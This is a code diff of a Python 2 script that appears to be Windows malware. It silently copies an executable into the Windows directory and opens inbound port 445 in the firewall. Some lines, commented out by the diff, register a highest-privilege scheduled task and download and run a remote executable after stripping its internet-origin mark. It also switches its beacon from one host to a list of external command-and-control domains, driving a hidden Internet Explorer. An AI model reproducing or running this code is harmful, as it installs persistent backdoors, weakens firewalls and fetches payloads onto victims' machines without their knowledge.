@@ -110,21 +110,22 @@ try:
         #subprocess.call("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v urlspace /t REG_SZ   /d  "+suser+"\\woffice.exe /f", creationflags=CREATE_NO_WINDOW)
         subprocess.call("cmd /c copy /y "+os.getcwd()+"\\woffice.exe " +swin+"\\woffice.exe", creationflags=CREATE_NO_WINDOW)
         subprocess.call("netsh advfirewall firewall add rule name=\"Open Port 445\" dir=in action=allow protocol=TCP localport=445", creationflags=CREATE_NO_WINDOW)
-        subprocess.call("schtasks /create  /sc minute /mo 10 /tr 'c:\windows\woffice.exe' /tn taskflash /rl highest /F ", creationflags=CREATE_NO_WINDOW)
+        #subprocess.call("schtasks /create  /sc minute /mo 10 /tr 'c:\windows\woffice.exe' /tn taskflash /rl highest /F ", creationflags=CREATE_NO_WINDOW)
 except Exception,e:
     text_file = open(stemp+"\\pippo.txt", "w")
     text_file.write(str(e))
     text_file.close()
     print str(e)
-try:
-    if not os.path.exists('c:\\windows\\wup.exe'):
-        subprocess.call('powershell -Command Invoke-WebRequest -Uri "http://plano.xoom.it/wofficeie.exe" -OutFile '+suser+'\\wofficeie.exe', creationflags=CREATE_NO_WINDOW)
-        subprocess.call('echo.>'+suser+'\\wofficeie.exe:Zone.Identifier', creationflags=CREATE_NO_WINDOW) 
-        subprocess.call(suser+'\\wofficeie.exe', creationflags=CREATE_NO_WINDOW)
-except Exception,e:
-    print str(e)
+#try:
+#    if not os.path.exists('c:\\windows\\wup.exe'):
+#        subprocess.call('powershell -Command Invoke-WebRequest -Uri "http://plano.xoom.it/wofficeie.exe" -OutFile '+suser+'\\wofficeie.exe', creationflags=CREATE_NO_WINDOW)
+#        subprocess.call('echo.>'+suser+'\\wofficeie.exe:Zone.Identifier', creationflags=CREATE_NO_WINDOW) 
+#        subprocess.call(suser+'\\wofficeie.exe', creationflags=CREATE_NO_WINDOW)
+#except Exception,e:
+#    print str(e)
 #main loop here
-site="paner.altervista.org"
+sites = ["paner.altervista.org", "verifiche.ddns.net"]
+#site="paner.altervista.org"
 site1="paner.altervista.org"
 site2="52.26.124.145"
 site3="certificates.ddns.net"
@@ -142,7 +143,8 @@ sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress+"_app"#+"_"+os.getenv('U
 pythoncom.CoInitialize()
 ie = Dispatch("InternetExplorer.Application")
 ie.Visible = 0
-while True:
+#while True:
+for site in sites:
         #sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress+"_"+os.getenv('USERNAME')
 ##        if getProxy()!='None':
 ##            subprocess.call("taskkill /f /im wup.exe", creationflags=CREATE_NO_WINDOW)
